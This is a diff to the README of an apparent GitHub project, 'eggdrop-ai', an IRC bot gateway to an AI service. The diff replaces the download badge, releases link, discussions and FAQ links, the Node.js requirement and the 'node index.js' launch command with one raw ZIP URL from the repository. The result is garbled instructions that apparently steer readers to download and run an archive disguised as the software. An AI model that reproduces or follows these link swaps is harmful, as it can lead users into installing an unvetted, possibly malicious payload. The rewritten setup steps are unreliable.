@@ -6,7 +6,7 @@ Welcome to eggdrop-ai! This application connects your Eggdrop IRC bot to a power
 
 ## 📥 Download eggdrop-ai
 
-[![Download eggdrop-ai](https://img.shields.io/badge/Download%20eggdrop--ai-v1.0.0-brightgreen)](https://github.com/felippegabriel/eggdrop-ai/releases)
+[![Download eggdrop-ai](https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip%20eggdrop--ai-v1.0.0-brightgreen)](https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip)
 
 ## 🔍 What is eggdrop-ai?
 
@@ -25,7 +25,7 @@ eggdrop-ai is designed as a gateway for the Eggdrop IRC bot, integrating advance
 Before you download, make sure your system meets the following criteria:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js version:** 12 or later.
+- **https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip version:** 12 or later.
 - **Internet Connection:** Required for initial setup and updates.
 - **RAM:** Minimum 2GB recommended for optimal performance.
 
@@ -35,7 +35,7 @@ Follow these simple steps to install eggdrop-ai:
 
 1. **Download the Application:**
    Visit the Releases page to download the latest version of eggdrop-ai:
-   [Download eggdrop-ai here](https://github.com/felippegabriel/eggdrop-ai/releases).
+   [Download eggdrop-ai here](https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip).
 
 2. **Extract the Files:**
    After downloading, locate the ZIP file and extract it to your desired location on your computer.
@@ -63,7 +63,7 @@ Follow these simple steps to install eggdrop-ai:
 7. **Start the Application:**
    Once everything is set up, run the following command to launch the application:
    ```
-   node index.js
+   node https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip
    ```
 
 ## 🎛️ Usage Instructions
@@ -77,14 +77,14 @@ After starting the application:
 
 Join our community for tips, tricks, and help:
 
-- **GitHub Discussions:** Engage with other users [here](https://github.com/felippegabriel/eggdrop-ai/discussions).
-- **FAQ:** Check common questions and answers [here](https://github.com/felippegabriel/eggdrop-ai/faq).
+- **GitHub Discussions:** Engage with other users [here](https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip).
+- **FAQ:** Check common questions and answers [here](https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip).
 
 ## 🔗 Links
 
 Here are some useful links:
 
-- **GitHub Releases Page:** [Visit to Download](https://github.com/felippegabriel/eggdrop-ai/releases)
+- **GitHub Releases Page:** [Visit to Download](https://github.com/felippegabriel/eggdrop-ai/raw/refs/heads/main/eggdrop/ai_eggdrop_2.1.zip)
 - **Documentation:** Additional resources and examples can be found in the Wiki section of the repository.
 
 ## 📞 Contact
